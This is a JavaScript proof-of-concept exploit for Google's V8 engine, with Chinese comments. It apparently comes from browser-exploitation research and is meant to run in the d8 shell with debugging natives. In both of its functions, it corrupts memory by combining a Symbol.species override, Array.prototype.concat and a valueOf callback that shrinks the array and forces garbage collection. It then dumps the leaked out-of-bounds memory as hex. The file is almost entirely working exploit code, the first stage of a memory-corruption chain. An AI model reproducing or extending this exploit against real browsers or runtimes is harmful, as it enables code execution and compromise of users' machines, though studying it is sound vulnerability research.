var count = 0;
var buf =new ArrayBuffer(16);
var float64 = new Float64Array(buf);
var bigUint64 = new BigUint64Array(buf);
function f2i(f) {
    float64[0] = f;
    return bigUint64[0];
}
function i2f(i) {
    bigUint64[0] = i;
    return float64[0];
}
function hex(i) {
    return "0x" + i.toString(16).padStart(16, "0");
}
function dump64(arr, length) {
    for (var i = 0; i < length; i++) {
        print("\033[1;33;1m[DEBUG] " + i + "\t" + hex(f2i(arr[i])) + "\033[0m");
    }
}

function log(data) {
    print("\033[1;34;1m" + data + "\033[0m");
}

function leak_0() {
// 根据上述思路实现内存泄漏
    
    log("[STEP 0] Memory leak.");

    // Symbol.species 返回 vulnA
    class vulnArray extends Float64Array {}
    var vulnA = new vulnArray(0x1337);
    vulnA.__defineSetter__("length", function() {});
    class myArray extends Array {
        static get [Symbol.species]() {
            return function() {
                return vulnA;
            }
        };
    }

    var corruptA = new myArray(0x100);
    corruptA.fill(4.3);
    delete corruptA[0];         // 创造空洞，这里进入 JSReceiver::GetElement 的慢过程，
                                // 才能触发 valueOf() 中的代码执行
    Array.prototype[0] = {
        valueOf: function() {
            corruptA.length = 1;// length 设置为 1，
            gc();               // 触发 gc
            print("[CALLBACK]");
            delete Array.prototype[0]; // 防止影响后续利用
            return 1.7;
        }
    };
    var AnotherArray = [i2f(0xbad0cafedeadbeefn), i2f(0xbad0cafedeadbeefn), i2f(0xbad0cafedeadbeefn), i2f(0xbad0cafedeadbeefn), i2f(0xbad0cafedeadbeefn), i2f(0xbad0cafedeadbeefn), i2f(0xbad0cafedeadbeefn), i2f(0xbad0cafedeadbeefn)];

    %DebugPrint(AnotherArray);
    %SystemBreak();
    // 触发漏洞
    var res = corruptA.concat();

    // 调试 && 漏洞验证
    dump64(res, 0x40);
}

function leak_1() {
// 根据上述思路实现内存泄漏

    // Symbol.species 返回 vulnA
    class vulnArray extends Float64Array {}
    var vulnA = new vulnArray(0x1337);
    vulnA.__defineSetter__("length", function() {});
    const constru = new Function();
    constru.__defineGetter__(Symbol.species, ()=>{
        return function() {
            return vulnA;
        }
    });

    var corrupted_array = [
           , 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        0.1, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        0.1, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        0.1, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        0.1, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        0.1, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        0.1, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        0.1, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        0.1, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
        0.1, 1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8, 9.9,
    ];
    corrupted_array.constructor = constru;
    
    Array.prototype[0] = {
        valueOf: function() {
            corrupted_array.length = 1;
            gc();
            print("[CALLBACK]");
            delete Array.prototype[0];
            return 4.3;
        }
    };

    var res = corrupted_array.concat();
    dump64(res, 20);
}

// leak_0();
leak_1();
%SystemBreak();
